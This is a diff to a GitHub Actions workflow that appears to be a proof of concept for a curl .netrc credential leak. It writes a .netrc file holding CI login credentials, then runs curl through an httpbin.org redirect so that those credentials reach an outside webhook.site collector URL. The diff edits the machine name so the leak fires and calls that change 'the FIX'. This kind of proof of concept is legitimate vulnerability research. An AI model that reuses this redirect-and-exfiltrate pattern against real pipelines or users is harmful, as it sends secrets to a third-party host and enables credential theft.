@@ -1,7 +1,6 @@
 name: Curl Netrc Leak PoC
 
 on:
-  # This allows us to run the workflow manually from the Actions tab
   workflow_dispatch:
 
 jobs:
@@ -10,9 +9,9 @@ jobs:
     steps:
       - name: Create malicious .netrc file
         run: |
-          # The machine name here MUST BE 'localhost' for this specific PoC to work
+          # This is the FIX: The machine name must match the first host we connect to.
           cat <<EOF > .netrc_poc
-          machine localhost
+          machine httpbin.org
           login ci_user
           password SuperSecretCiKey123
 
@@ -24,8 +23,5 @@ jobs:
 
       - name: Trigger the vulnerability using a redirector service
         run: |
-          echo "--- Triggering vulnerability ---"
-          # This command uses a free redirect service (httpbin.org)
-          # It tells httpbin.org to redirect to YOUR webhook URL.
-          # Curl reads credentials for 'localhost' and leaks them to the final destination.
+          # The command remains the same.
           curl -v -L --netrc-file .netrc_poc "https://httpbin.org/redirect-to?url=https://webhook.site/163be8c4-85f1-42eb-8cbe-ec643d9888db"
